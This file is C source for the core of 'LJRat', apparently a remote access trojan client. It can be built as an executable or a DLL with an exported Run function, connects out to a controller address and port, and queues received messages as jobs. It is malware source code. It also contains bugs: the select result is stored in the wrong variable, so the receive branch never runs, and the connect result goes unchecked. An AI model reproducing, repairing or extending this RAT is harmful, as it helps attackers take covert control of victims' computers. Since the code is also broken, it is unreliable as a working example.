#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <Windows.h>
#include "error.h"
#include "LJRat.h"
#include "session.h"
#include "debug.h"
#include "message.h"
#include "list.h"

int gShutdown;
SRW_LIST_HEAD job_list;
SRW_LIST_HEAD send_list;

#ifndef BUILD_DLL

INT main(INT argc, CHAR *argv[])
{
    Run(argc, argv);
}

#else

#define EXPORT_FUNC __declspec(dllexport)
#define TARGET_PORT 5555
#define TARGET_IP "127.0.0.1"

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}

#endif // BUILD_DLL

#ifndef BUILD_DLL
EXPORT_FUNC ERROR_T Run(INT argc, CHAR *argv[])
#else
EXPORT_FUNC ERROR_T Run(VOID)
#endif // BUILD_DLL
{
    INT iError = E_SUCCESS;
    INT iStartup = E_SUCCESS;
    WSADATA wData;
    SOCKET sock;
    DWORD dwPort = 0;
    INT iSelectRet = 0;
    SOCKADDR_IN addr = {0};
    SESSION session = {0};
    fd_set read_fds = {0};
    TIMEVAL timeout = {0};
    PMESSAGE pMsg = NULL;
    PLIST_ITEM pTemp = NULL;

    gShutdown = 0;
    SRWListInitialize(&job_list);
    SRWListInitialize(&send_list);

    iStartup = WSAStartup(MAKEWORD(2,2), &wData);
    if (E_SUCCESS != iStartup)
    {
        goto end;
    }

    addr.sin_family = AF_INET;

    #ifndef BUILD_DLL
    dwPort = atoi(argv[2]);

    if (dwPort < 1 || dwPort > 65535)
    {
        goto end;
    }

    dwPort = htons(dwPort);
    addr.sin_port = (WORD)dwPort;
    addr.sin_addr.s_addr = inet_addr(argv[1]);

    #else
    addr.sin_port = htons(TARGET_PORT);
    addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    #endif // BUILD_DLL

    if (INADDR_NONE == addr.sin_addr.s_addr)
    {
        goto end;
    }

    iError = SessionInit(&session, AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (E_SUCCESS != iError) {
        goto end;
    }

    iError = SessionConnect(&session, &addr);

    // Set Select timeout to 1 second so we can check for shutdown condition.
    timeout.tv_sec = 1;

    while (SHUTDOWN_INITIATED != gShutdown)
        {
            FD_ZERO(&read_fds);
            FD_SET(session.sock, &read_fds);
            iError = select(0, &read_fds, NULL, NULL, &timeout);

            switch (iSelectRet) {
                case 0:
                    DBG_PRINT("Timeout\n");
                    continue;
                case 1:
                    iError = MessageReceive(session.sock, &pMsg);
                    if (ERROR_SUCCESS != iError) {
                        continue;
                    }
                    pTemp = ListItemCreate((PVOID) pMsg);
                    SRWListAddTail(&job_list, &pTemp->link);
                    continue;
                default:
                    DBG_PRINT("Error %d\n", WSAGetLastError());
                    ;
            }

        }

    end:
    if (0 == iStartup)
    {
        WSACleanup();
    }

    return iError;
}